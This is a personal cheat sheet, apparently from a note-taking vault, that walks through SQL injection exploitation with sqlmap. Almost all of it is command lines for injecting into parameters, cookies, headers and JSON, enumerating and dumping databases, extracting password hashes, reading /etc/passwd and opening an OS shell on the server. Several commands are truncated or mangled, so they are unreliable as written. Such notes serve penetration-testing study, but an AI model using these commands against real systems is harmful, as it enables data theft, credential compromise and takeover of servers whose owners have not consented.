
[[1. SQLi]]

## ğŸ§  SQLMap: **Zero to Hero â€“ Full-Scope Exploitation Guide**


## What is SqlMap ? 

- `sqlmap` is a fully automated **SQL injection and database takeover tool.**
- *It identifies vulnerabilities, fingerprints the DBMS, enumerates  databases/tables/users, extracts data, bypasses protections, and even drops backdoors.*

## ğŸ“š II. Core SQL Injection Types sqlmap Handles

| Injection Type                    | Description                                          |
| --------------------------------- | ---------------------------------------------------- |
| âœ… **Boolean-based Blind**         | Responses differ based on true/false logic           |
| âœ… **Time-based Blind**            | Exploits query execution delays                      |
| âœ… **Error-based**                 | Uses DB error messages to extract info               |
| âœ… **UNION-based**                 | Combines multiple SELECTs to extract data            |
| âœ… **Stacked Queries**             | Executes multiple SQL queries in one shot            |
| âœ… **Inline Query / Second-Order** | Injection occurs in one request, executed in another |

---
## ğŸ§ª III. Phase-by-Phase sqlmap Progression

### 1ï¸âƒ£ **Recon & Basic Testing**

#### ğŸ”§ Basic GET Param Injection

`sqlmap -u "http://target.com/page.php?id=1" --batch`
#### ğŸ”§ POST Form Field Injection

`sqlmap -u "http://target.com/login.php" --data="username=admin&password=123" --batch`

---
### 2ï¸âƒ£ **Database Discovery & Enumeration**

### ğŸ¯ List DBMS & Banner

`sqlmap -u URL --banner
### ğŸ¯ List Databases

`sqlmap -u URL --dbs`

### ğŸ¯ List Tables in a DB

`sqlmap -u URL -D database_name --tables`

### ğŸ¯ List Columns in a Table

`sqlmap -u URL -D database_name -T table_name --columns`

### ğŸ¯ Dump Table Data

`sqlmap -u URL -D database_name -T table_name --dump`

___
### 3ï¸âƒ£ **Authentication Handling**

#### ğŸ”‘ Cookie-Based Injection

`sqlmap -u URL --cookie="session=abc 123*"`
#### ğŸ”‘ HTTP Basic Auth

`sqlmap -u URL --auth-type=basic --auth-cred=user:pass`
#### ğŸ”‘ Login Form Session Preservation
-  Capture request in Burp â†’ Save to request. Txt

`sqlmap -r request. Txt --batch`

___
### 4ï¸âƒ£ **Advanced Extraction Flags**

#### ğŸ” Extract Passwords & Hashes

`sqlmap -u URL --passwords`

#### ğŸ” Extract Usernames & Privileges

`sqlmap -u URL --users --roles --privileges`

#### ğŸ” Extract File Content

`sqlmap -u URL --file-read="/etc/passwd"`

#### ğŸ’£ Upload Web Shell

`sqlmap -u URL --os-shell`

---
### 5ï¸âƒ£ **Injection Target Precision**

### ğŸ¯ Inject Into Cookie

`sqlmap -u URL --cookie="session=abc123*" --batch`

### ğŸ¯ Inject Into Cookie (Enhanced Version)

`sqlmap -u URL --cookie="session=1*" --level=5 --risk=3 --technique=BEUSTQ --dump`

### ğŸ¯ Inject Into Cookie with post data (Enhanced Version)

`sqlmap -u "http://localhost/labs/i0x02.php"--cookie="session=6967 cabefd 763 ac 1 a 1 a 88 e 11159957 db*" --data="username=jeremy&password=jeremy" --level=5 --risk=3 --technique=BEUSTQ --batch`

#### ğŸ¯ Inject Into Headers

`sqlmap -u URL --headers="User-Agent: Mozilla/5.0*"`

#### ğŸ¯ Inject Into POST Data

`sqlmap -u URL --data="search=abc*" --batch`

#### ğŸ¯ Second-Order Injection

`sqlmap -u URL --data="username=abc" --second-order="http://targe`

---
## 6ï¸âƒ£ **Payload Types and Modes**

#sqlmap-techniques

| **Technique** | **Flag**        | **Description**     |
| ------------- | --------------- | ------------------- |
| **B**         | `--technique=B` | Boolean-based blind |
| **E**         | `--technique=E` | Error-based         |
| **U**         | `--technique=U` | UNION query-based   |
| **S**         | `--technique=S` | Stacked queries     |
| **T**         | `--technique=T` | Time-based blind    |
| **Q**         | `--technique=Q` | Inline queries      |

---
### 7ï¸âƒ£ Real-World Scenarios (and flags)

#### ğŸ” Authenticated Panel Injection

- Capture POST request after login
    
- Save to `login.txt`
    

`sqlmap -r login.txt --level=5 --risk=3 --technique=BEUSTQ --batch`

#### ğŸ” API Token Injection

`sqlmap -u URL --headers="X-API-KEY: token123*" --batch`

#### ğŸ” JSON Injection

`sqlmap -u URL --data='{"search":"abc*"}' --batch --headers="Conten`

___
# ğŸ§  8ï¸âƒ£ Understanding sqlmap Intelligence

### ğŸ’¡ Risk Levels:

|Risk|Description|
|---|---|
|1|Safe, non-destructive payloads|
|2|Adds UNION/stacked queries|
|3|Includes time-based / heavy tests|

### ğŸ’¡ Level:

|Level|Description|
|---|---|
|1|Basic params (GET only)|
|5|Includes GET, POST, headers, cookies, User-Agent|

---
# ğŸ§™â€â™‚ï¸ 9ï¸âƒ£ sqlmap: Black Belt Moves

## ğŸ”„ Mirror Entire DB

`sqlmap -u URL --dump-all`